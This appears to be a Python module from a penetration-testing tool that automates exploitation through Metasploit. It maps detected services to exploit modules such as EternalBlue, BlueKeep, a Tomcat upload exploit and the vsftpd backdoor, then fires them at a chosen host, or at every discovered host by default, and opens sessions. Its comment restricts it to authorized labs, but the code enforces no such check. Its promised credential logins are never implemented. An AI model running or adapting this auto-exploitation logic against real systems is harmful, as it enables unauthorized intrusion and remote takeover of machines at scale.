# Opt-in attack service: actively attempts exploitation using Metasploit
# exploit modules and, when credentials are known, credential logins (with an
# optional session). Runs ONLY against authorized lab targets, and ONLY when a
# scan explicitly enables it.
import logging
from collections.abc import Callable
from typing import Any

from schemas import AttackRequest
from services.msfrpc import MsfClient

logger = logging.getLogger("h4k.attack")


class AttackService:
    def __init__(
        self,
        msf: MsfClient,
        progress: Callable[[str, float], None] | None = None,
        cve_db: Any | None = None,
    ):
        self.msf = msf
        self.progress = progress or (lambda msg, pct: None)

    def run(self, req: AttackRequest, known_creds: list[dict]) -> list[dict]:
        """Execute attacks for the services requested. Returns Attack dicts."""
        attacks: list[dict] = []
        hosts = self._resolve_hosts(req)
        for host in hosts:
            for svc in self._resolve_services(req, host):
                module = self._module_for_service(svc)
                if not module:
                    continue
                self.progress(f"attacking {host} {svc} via {module}", 0)
                res = self._try_exploit(module, host, svc, req.open_sessions)
                attacks.append(
                    {
                        "host": host,
                        "service": svc,
                        "module": module,
                        "result": "success" if res["ok"] else "failed",
                        "detail": res["detail"],
                        "session_id": res.get("session_id"),
                    }
                )
        return attacks

    def _resolve_hosts(self, req: AttackRequest) -> list[str]:
        if req.host:
            return [req.host]
        # If no specific host, attack all discovered hosts (from msf db).
        try:
            ws = self.msf.current_workspace() or "default"
            return [h.get("address") for h in self.msf.hosts(ws) if h.get("address")]
        except Exception as exc:
            logger.warning("could not list hosts for attack: %s", exc)
            return []

    def _resolve_services(self, req: AttackRequest, host: str) -> list[str]:
        if req.services:
            return req.services
        # default: attack services that map to an exploit module
        ws = self.msf.current_workspace() or "default"
        names: list[str] = []
        try:
            for s in self.msf.services(ws):
                if s.get("host") != host:
                    continue
                if self._module_for_service(s.get("name") or ""):
                    names.append(s.get("name"))
        except Exception as exc:
            logger.warning("could not resolve services: %s", exc)
        return names

    @staticmethod
    def _module_for_service(service: str) -> str | None:
        s = (service or "").lower()
        if "ssh" in s:
            return "exploit/multi/ssh/sshexec"
        if "smb" in s or "microsoft-ds" in s or "netbios" in s:
            return "exploit/windows/smb/ms17_010_eternalblue"
        if "rdp" in s or "ms-wbt" in s:
            return "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
        if "http" in s:
            return "exploit/multi/http/tomcat_mgr_upload"
        if "ftp" in s:
            return "exploit/unix/ftp/vsftpd_234_backdoor"
        if "telnet" in s:
            return "exploit/multi/telnet/telnet_binary_options"
        return None

    def _try_exploit(
        self, module: str, host: str, svc: str, open_sessions: bool
    ) -> dict:
        """Set sensible per-module options and execute. Report success/session."""
        opts: dict[str, Any] = {
            "RHOSTS": host,
            "StopOnSuccess": True,
        }
        # Only set CreateSession on modules that support it. For those that
        # don't, we send the base opts (most exploits open a handler/session
        # via LHOST/LPORT anyway); `open_sessions` is best-effort.
        if open_sessions:
            opts["CreateSession"] = True
        try:
            try:
                res = self.msf.execute("exploit", module, opts)
            except Exception as exc:
                # retry without CreateSession if the module rejects it
                if "CreateSession" in str(exc):
                    opts.pop("CreateSession", None)
                    res = self.msf.execute("exploit", module, opts)
                else:
                    raise
            session_id = None
            if isinstance(res, dict):
                session_id = res.get("job_id")
                ok = (res.get("status") == "success") or session_id is not None
            else:
                ok = bool(res)
            return {"ok": ok, "detail": str(res)[:200], "session_id": session_id}
        except Exception as exc:
            return {"ok": False, "detail": str(exc)[:200], "session_id": None}
